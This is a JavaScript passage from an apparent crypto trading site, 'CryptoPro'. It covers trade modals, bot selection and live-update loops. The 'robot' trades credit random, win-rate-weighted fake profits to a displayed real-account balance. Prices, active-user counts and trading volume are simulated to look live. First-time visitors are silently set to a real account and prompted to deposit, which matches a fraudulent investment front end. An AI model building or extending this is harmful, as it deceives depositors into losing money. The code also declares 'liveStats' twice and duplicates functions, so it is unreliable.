    const balance = appState.accountType === 'demo' ? appState.demoBalance : appState.displayBalance;

    if (appState.accountType === 'real' && balance < CONFIG.MINIMUM_BALANCE_FOR_TRADING) {
        if (confirm(`❌ Insufficient Balance\n\nMinimum: $${CONFIG.MINIMUM_BALANCE_FOR_TRADING}\nYour balance: $${balance.toFixed(2)}\n\nDeposit now?`)) {
            openUniversalDepositModal();
        }
        return;
    }
    
    const modal = document.createElement('div');
    modal.className = 'modal active';
    modal.id = 'tradeModal';
    modal.innerHTML = `
    <div class="modal-content">
        <div class="modal-header">
            <h2>📊 Trade ${pair}</h2>
            <button class="close-btn" onclick="closeTradeModal()">×</button>
        </div>
        <div class="modal-body">
            <div class="info-box">
                <strong>💰 Available: $${balance.toFixed(2)}</strong><br>
                <small>Price: $${cryptoPrices[pair].toFixed(2)}</small>
            </div>
            
            <div class="form-group">
                <label>Trade Type</label>
                <select id="tradeType">
                    <option value="BUY">🟢 BUY (Long)</option>
                    <option value="SELL">🔴 SELL (Short)</option>
                </select>
            </div>
            
            <input type="hidden" id="tradePair" value="${pair}">
            
            <div class="form-group">
                <label>Amount (USD)</label>
                <input type="number" id="tradeAmount" placeholder="Min: $10" min="10" step="0.01">
            </div>
            
            <div style="font-size: 12px; color: rgba(255,255,255,0.6); margin: 16px 0; line-height: 1.6;">
                📈 Target: +5%<br>
                📉 Stop Loss: -2%<br>
                ⚡ Auto-closes at target/stop
            </div>
            
            <button class="btn btn-primary btn-full" onclick="executeTrade()">
                ⚡ EXECUTE TRADE
            </button>
        </div>
    </div>
    `;
    document.body.appendChild(modal);
}

function executeTrade() {
    const amount = parseFloat(document.getElementById('tradeAmount').value);
    const type = document.getElementById('tradeType').value;
    const pair = document.getElementById('tradePair').value;

    const balance = appState.accountType === 'demo' ? appState.demoBalance : appState.displayBalance;
    
    if (!amount || amount < 10) {
        alert('❌ Minimum: $10');
        return;
    }
    
    if (balance < amount) {
        alert(`❌ Insufficient!\n\nBalance: $${balance.toFixed(2)}\nRequired: $${amount.toFixed(2)}`);
        return;
    }
    
    if (appState.accountType === 'demo') {
        appState.demoBalance -= amount;
    } else {
        appState.displayBalance -= amount;
    }
    
    const entryPrice = cryptoPrices[pair];
    const target = type === 'BUY' ? entryPrice * 1.05 : entryPrice * 0.95;
    const stopLoss = type === 'BUY' ? entryPrice * 0.98 : entryPrice * 1.02;
    
    const trade = {
        id: Date.now().toString(),
        pair: pair,
        type: type,
        amount: amount,
        entryPrice: entryPrice,
        currentPrice: entryPrice,
        target: target,
        stopLoss: stopLoss,
        profitLoss: 0,
        timestamp: new Date().toISOString()
    };
    
    appState.activeTrades.push(trade);
    saveState();
    updateUI();
    closeTradeModal();
    
    alert(`✅ Trade Executed!\n\n${pair} ${type}\n$${amount.toFixed(2)}\nEntry: $${entryPrice.toFixed(2)}`);
}

function closeTradeModal() {
    const modal = document.getElementById('tradeModal');
    if (modal) {
        modal.classList.remove('active');
        setTimeout(() => modal.remove(), 300);
    }
}

// ==================== ROBOT TRADING SIMULATION ====================
function simulateRobotTrade() {
    if (appState.selectedBot === 'none' || appState.accountType !== 'real' || appState.displayBalance < 50) {
        return;
    }
    
    const now = Date.now();
    
    if (now - appState.lastRobotTradeTime < CONFIG.ROBOT_TRADE_INTERVAL) {
        return;
    }
    
    appState.lastRobotTradeTime = now;
    
    const botConfig = appState.availableBots[appState.selectedBot];
    
    const pairs = Object.keys(cryptoPrices);
    const pair = pairs[Math.floor(Math.random() * pairs.length)];
    
    const isProfit = Math.random() < botConfig.profitRate;
    
    let profitAmount;
    if (isProfit) {
        profitAmount = botConfig.minProfit + Math.random() * (botConfig.maxProfit - botConfig.minProfit);
    } else {
        profitAmount = -(botConfig.minProfit * 0.3 + Math.random() * (botConfig.minProfit * 0.5));
    }
    
    const robotTrade = {
        id: 'robot_' + Date.now(),
        pair: pair,
        type: isProfit ? 'BUY' : 'SELL',
        profit: profitAmount,
        timestamp: new Date().toISOString(),
        botName: botConfig.name,
        botIcon: botConfig.icon
    };
    
    appState.displayBalance += profitAmount;
    appState.totalRobotProfits += profitAmount;
    
    appState.robotTrades.unshift(robotTrade);
    if (appState.robotTrades.length > 20) {
        appState.robotTrades = appState.robotTrades.slice(0, 20);
    }
    
    appState.transactions.push({
        id: robotTrade.id,
        type: 'ROBOT_TRADE',
        amount: profitAmount,
        description: `${robotTrade.botIcon} ${robotTrade.botName} - ${pair}`,
        timestamp: robotTrade.timestamp
    });
    
    saveState();
    updateUI();
    
    if (profitAmount !== 0) {
        showRobotTradeNotification(robotTrade);
    }
}

function showRobotTradeNotification(trade) {
    const notification = document.createElement('div');
    const isProfit = trade.profit > 0;
    
    notification.style.cssText = `
        position: fixed;
        top: 80px;
        right: 20px;
        background: ${isProfit ? 'linear-gradient(135deg, #00ff88 0%, #00cc6a 100%)' : 'linear-gradient(135deg, #ff006e 0%, #cc0055 100%)'};
        color: ${isProfit ? '#000' : '#fff'};
        padding: 16px 20px;
        border-radius: 12px;
        box-shadow: 0 4px 20px rgba(0, 255, 136, 0.3);
        z-index: 9999;
        font-weight: bold;
        max-width: 300px;
    `;
    
    notification.innerHTML = `
        <div style="display: flex; align-items: center; gap: 12px;">
            <div style="font-size: 24px;">${trade.botIcon}</div>
            <div>
                <div style="font-size: 14px; margin-bottom: 4px;">${trade.botName}</div>
                <div style="font-size: 12px; opacity: 0.8;">${trade.pair} • ${isProfit ? '+' : ''}$${trade.profit.toFixed(2)}</div>
            </div>
        </div>
    `;
    
    document.body.appendChild(notification);
    
    setTimeout(() => notification.remove(), 4000);
}

// ==================== BOT SELECTION MODAL ====================
function openBotSelectionModal() {
    const modal = document.createElement('div');
    modal.className = 'modal active';
    modal.id = 'botSelectionModal';
    
    const botsHTML = Object.keys(appState.availableBots).map(botKey => {
        const bot = appState.availableBots[botKey];
        const isSelected = appState.selectedBot === botKey;
        
        return `
            <div class="bot-card ${isSelected ? 'selected' : ''}" onclick="selectBot('${botKey}')" style="
                background: ${isSelected ? 'rgba(0, 255, 136, 0.2)' : 'rgba(10, 25, 45, 0.6)'};
                border: 2px solid ${isSelected ? '#00ff88' : 'rgba(100, 200, 255, 0.2)'};
                padding: 20px;
                border-radius: 16px;
                margin-bottom: 16px;
                cursor: pointer;
                transition: all 0.3s;
            ">
                <div style="display: flex; align-items: center; gap: 16px; margin-bottom: 12px;">
                    <div style="font-size: 36px;">${bot.icon}</div>
                    <div style="flex: 1;">
                        <div style="font-size: 18px; font-weight: 700; margin-bottom: 4px;">${bot.name}</div>
                        <div style="font-size: 13px; opacity: 0.7;">${bot.description}</div>
                    </div>
                    ${isSelected ? '<div style="color: #00ff88; font-size: 24px;">✓</div>' : ''}
                </div>
                ${botKey !== 'none' ? `
                    <div style="display: flex; gap: 12px; font-size: 12px;">
                        <div style="flex: 1; text-align: center; background: rgba(0, 255, 136, 0.1); padding: 8px; border-radius: 8px;">
                            <strong>${(bot.profitRate * 100).toFixed(0)}%</strong><br>
                            <span style="opacity: 0.7;">Win Rate</span>
                        </div>
                        <div style="flex: 1; text-align: center; background: rgba(0, 217, 255, 0.1); padding: 8px; border-radius: 8px;">
                            <strong>$${bot.minProfit}-${bot.maxProfit}</strong><br>
                            <span style="opacity: 0.7;">Per Trade</span>
                        </div>
                    </div>
                ` : ''}
            </div>
        `;
    }).join('');
    
    modal.innerHTML = `
        <div class="modal-content" style="max-width: 500px;">
            <div class="modal-header">
                <h2>🤖 Select Trading Bot</h2>
                <button class="close-btn" onclick="closeBotSelection()">×</button>
            </div>
            <div class="modal-body">
                <div class="info-box" style="margin-bottom: 20px;">
                    <strong>💡 How it works:</strong><br>
                    Select a bot to automate your trading. The bot will execute trades every 15 seconds based on its strategy and win rate.
                </div>
                
                ${botsHTML}
                
                <button class="btn btn-primary btn-full" onclick="closeBotSelection()" style="margin-top: 20px;">
                    ${appState.selectedBot !== 'none' ? '✅ START BOT' : '✅ CONFIRM'}
                </button>
            </div>
        </div>
    `;
    
    document.body.appendChild(modal);
}

function selectBot(botKey) {
    appState.selectedBot = botKey;
    saveState();
    updateUI();
    closeBotSelection();
    setTimeout(() => openBotSelectionModal(), 100);
}

function closeBotSelection() {
    const modal = document.getElementById('botSelectionModal');
    if (modal) {
        modal.classList.remove('active');
        setTimeout(() => modal.remove(), 300);
    }
}

console.log('✅ CryptoPro App Loaded Successfully');
// ==================== DYNAMIC LIVE STATS ====================
let liveStats = {
    activeUsers: Math.floor(Math.random() * 400) + 850, // Start random 850-1250
    volume: 90 + Math.random() * 15, // Start random $90M-$105M
    lastUpdate: Date.now()
};

function updateLiveStats() {
    // Active users fluctuate realistically
    const userChange = Math.floor(Math.random() * 60) - 30; // -30 to +30
    liveStats.activeUsers = Math.max(50, Math.min(1500, liveStats.activeUsers + userChange));
    
    // Volume changes slightly
    const volumeChange = (Math.random() - 0.5) * 3;
    liveStats.volume = Math.max(85, Math.min(120, liveStats.volume + volumeChange));
    
    // Update DOM
    const activeUsersEl = document.getElementById('activeUsers');
    const volumeEl = document.getElementById('volume24h');
    
    if (activeUsersEl) {
        activeUsersEl.textContent = liveStats.activeUsers.toLocaleString();
    }
    
    if (volumeEl) {
        volumeEl.textContent = '$' + liveStats.volume.toFixed(1) + 'M';
    }
}

function simulateUserActivity() {
    const random = Math.random();
    
    if (random < 0.25) {
        // Users leaving
        liveStats.activeUsers = Math.max(50, liveStats.activeUsers - Math.floor(Math.random() * 8 + 1));
    } else if (random < 0.5) {
        // Users joining
        liveStats.activeUsers = Math.min(1500, liveStats.activeUsers + Math.floor(Math.random() * 12 + 1));
    }
    
    const activeUsersEl = document.getElementById('activeUsers');
    if (activeUsersEl) {
        activeUsersEl.textContent = liveStats.activeUsers.toLocaleString();
    }
}

// User session tracking
document.addEventListener('DOMContentLoaded', function() {
    liveStats.activeUsers = Math.min(1500, liveStats.activeUsers + 1);
    updateLiveStats();
});

window.addEventListener('beforeunload', function() {
    liveStats.activeUsers = Math.max(50, liveStats.activeUsers - 1);
});function startLiveUpdates() {
    // Update prices every 2 seconds
    setInterval(updatePrices, 2000);
    
    // Update active trades every second
    setInterval(updateActiveTrades, 1000);
    
    // Update live stats every 3 seconds
    setInterval(updateLiveStats, 3000);
    
    // Simulate user activity every 4 seconds
    setInterval(simulateUserActivity, 4000);
    
    // Robot trading
    if (CONFIG.ENABLE_TRADING_ROBOTS) {
        setInterval(simulateRobotTrade, CONFIG.ROBOT_TRADE_INTERVAL);
    }
    
    // Initial stats update
    updateLiveStats();
}
// ==================== INITIALIZE LIVE UPDATES ====================
document.addEventListener('DOMContentLoaded', function() {
    console.log('💎 CryptoPro Active - Admin Control System');
    loadState();
    if (!localStorage.getItem('hasVisited')) {
        appState.accountType = 'real';
        localStorage.setItem('hasVisited', 'true');
    }
    updateUI();
    startLiveUpdates(); // This starts all intervals
    checkAdminStatus();
    initializeLiveStats(); // Initialize stats properly
});

// ==================== LIVE STATS INITIALIZATION ====================
let liveStats = {
    activeUsers: 0,
    volume: 0,
    lastUpdate: 0
};

function initializeLiveStats() {
    // Set initial random values
    liveStats.activeUsers = Math.floor(Math.random() * 400) + 850;
    liveStats.volume = 90 + Math.random() * 15;
    liveStats.lastUpdate = Date.now();
    
    // Initial update
    updateLiveStatsDisplay();
    
    // Start intervals for live updates
    setInterval(updateLiveStats, 3000); // Update every 3 seconds
    setInterval(simulateUserActivity, 5000); // Simulate activity every 5 seconds
}

function updateLiveStats() {
    // Active users fluctuate realistically
    const userChange = Math.floor(Math.random() * 60) - 30; // -30 to +30
    liveStats.activeUsers = Math.max(50, Math.min(1500, liveStats.activeUsers + userChange));
    
    // Volume changes slightly
    const volumeChange = (Math.random() - 0.5) * 3;
    liveStats.volume = Math.max(85, Math.min(120, liveStats.volume + volumeChange));
    
    liveStats.lastUpdate = Date.now();
    
    updateLiveStatsDisplay();
}

function updateLiveStatsDisplay() {
    const activeUsersEl = document.getElementById('activeUsers');
    const volumeEl = document.getElementById('volume24h');
    
    if (activeUsersEl) {
        activeUsersEl.textContent = liveStats.activeUsers.toLocaleString();
    }
    
    if (volumeEl) {
        volumeEl.textContent = '$' + liveStats.volume.toFixed(1) + 'M';
    }
}

function simulateUserActivity() {
    const random = Math.random();
    
    if (random < 0.25) {
        // Users leaving
        liveStats.activeUsers = Math.max(50, liveStats.activeUsers - Math.floor(Math.random() * 8 + 1));
    } else if (random < 0.5) {
        // Users joining
        liveStats.activeUsers = Math.min(1500, liveStats.activeUsers + Math.floor(Math.random() * 12 + 1));
    }
    
    updateLiveStatsDisplay();
}

// ==================== CORRECTED startLiveUpdates FUNCTION ====================
function startLiveUpdates() {
    // Update prices every 2 seconds
    setInterval(updatePrices, 2000);
    
    // Update active trades every second
    setInterval(updateActiveTrades, 1000);
    
    // Update live stats every 3 seconds
    setInterval(updateLiveStats, 3000);
    
    // Simulate user activity every 4 seconds
    setInterval(simulateUserActivity, 4000);
    
    // Robot trading
    if (CONFIG.ENABLE_TRADING_ROBOTS) {
        setInterval(simulateRobotTrade, CONFIG.ROBOT_TRADE_INTERVAL);
    }
    
    // Initial stats update
    updateLiveStats();
}

// ==================== IMPROVED updatePrices FUNCTION ====================
function updatePrices() {
    Object.keys(cryptoPrices).forEach(pair => {
        const oldPrice = cryptoPrices[pair];
        
        // Determine volatility based on asset type
        let volatility;
        if (pair === 'BTC/USDT') {
            volatility = 100;
        } else if (pair.includes('XAU') || pair.includes('XAG')) {
            volatility = 5;
        } else if (pair.includes('ETH') || pair.includes('BNB')) {
            volatility = 30;
        } else {
            volatility = 20;
        }
        
        // Calculate price change
        const change = (Math.random() - 0.5) * volatility;
        const newPrice = oldPrice + change;
        
        // Ensure price doesn't drop below 95% of original or go too high
        cryptoPrices[pair] = Math.max(newPrice, oldPrice * 0.95);
        cryptoPrices[pair] = Math.min(cryptoPrices[pair], oldPrice * 1.05);
        
        // Calculate percentage change
        priceChanges[pair] = ((cryptoPrices[pair] - oldPrice) / oldPrice) * 100;

        // Update DOM elements
        const pairKey = pair.split('/')[0].toLowerCase();
        const priceEl = document.getElementById(pairKey + 'Price');
        const changeEl = document.getElementById(pairKey + 'Change');
        
        if (priceEl) {
            const decimals = cryptoPrices[pair] < 1 ? 4 : 2;
            priceEl.textContent = '$' + cryptoPrices[pair].toFixed(decimals);
            
            // Add flash animation on price change
            priceEl.style.transition = 'color 0.3s';
            priceEl.style.color = priceChanges[pair] >= 0 ? '#00ff88' : '#ff006e';
            setTimeout(() => {
                priceEl.style.color = '';
            }, 300);
        }
        
        if (changeEl) {
            changeEl.textContent = (priceChanges[pair] >= 0 ? '+' : '') + priceChanges[pair].toFixed(2) + '%';
            changeEl.className = 'asset-change ' + (priceChanges[pair] >= 0 ? 'positive' : 'negative');
        }
    });
}

// ==================== IMPROVED updateActiveTrades FUNCTION ====================
function updateActiveTrades() {
    if (appState.activeTrades.length === 0) return;
    
    appState.activeTrades.forEach((trade, index) => {
        const currentPrice = cryptoPrices[trade.pair];
        if (!currentPrice) return;
        
        const priceChange = currentPrice - trade.entryPrice;
        const multiplier = trade.amount / trade.entryPrice;
        
        // Calculate profit/loss based on trade type
        if (trade.type === 'BUY') {
            trade.profitLoss = priceChange * multiplier;
        } else {
            trade.profitLoss = -priceChange * multiplier;
        }
        
        trade.currentPrice = currentPrice;
        
        // Check if trade should be closed
        let shouldClose = false;
        
        if (trade.type === 'BUY') {
            // Close if price hits target (profit) or stop loss
            if (currentPrice >= trade.target || currentPrice <= trade.stopLoss) {
                shouldClose = true;
            }
        } else {
            // Close if price hits target (profit) or stop loss
            if (currentPrice <= trade.target || currentPrice >= trade.stopLoss) {
                shouldClose = true;
            }
        }
        
        if (shouldClose) {
            closeTrade(index);
        }
    });
    
    saveState();
    updateTradesDisplay(); // Update trades display if you have one
}

function updateTradesDisplay() {
    const tradesContainer = document.getElementById('activeTradesContainer');
    if (!tradesContainer) return;
    
    if (appState.activeTrades.length === 0) {
        tradesContainer.innerHTML = '<p style="opacity: 0.5; text-align: center;">No active trades</p>';
        return;
    }
    
    tradesContainer.innerHTML = appState.activeTrades.map(trade => {
        const isProfitable = trade.profitLoss >= 0;
        return `
            <div style="padding: 12px; background: rgba(255,255,255,0.05); border-radius: 8px; margin-bottom: 8px;">
                <div style="display: flex; justify-content: space-between; align-items: center;">
                    <div>
                        <strong>${trade.pair}</strong> ${trade.type}
                        <div style="font-size: 12px; opacity: 0.7;">Entry: $${trade.entryPrice.toFixed(2)}</div>
                    </div>
                    <div style="text-align: right;">
                        <div style="color: ${isProfitable ? '#00ff88' : '#ff006e'}; font-weight: bold;">
                            ${isProfitable ? '+' : ''}$${trade.profitLoss.toFixed(2)}
                        </div>
                        <div style="font-size: 12px; opacity: 0.7;">Current: $${trade.currentPrice.toFixed(2)}</div>
                    </div>
                </div>
            </div>
        `;
    }).join('');
}

// ==================== USER SESSION TRACKING (CORRECTED) ====================
// Track when user joins
window.addEventListener('load', function() {
    if (liveStats.activeUsers > 0) {
        liveStats.activeUsers = Math.min(1500, liveStats.activeUsers + 1);
        updateLiveStatsDisplay();
    }
});

// Track when user leaves
window.addEventListener('beforeunload', function() {
    if (liveStats.activeUsers > 0) {
        liveStats.activeUsers = Math.max(50, liveStats.activeUsers - 1);
    }
});

// ==================== VISIBILITY CHANGE HANDLING ====================
document.addEventListener('visibilitychange', function() {
    if (document.hidden) {
        // User switched tabs - slow down updates to save resources
        console.log('Tab inactive - slowing updates');
    } else {
        // User returned - ensure updates are running
        console.log('Tab active - resuming normal updates');
        updateLiveStatsDisplay();
        updatePrices();
    }
});

console.log('✅ Live Updates System Initialized');
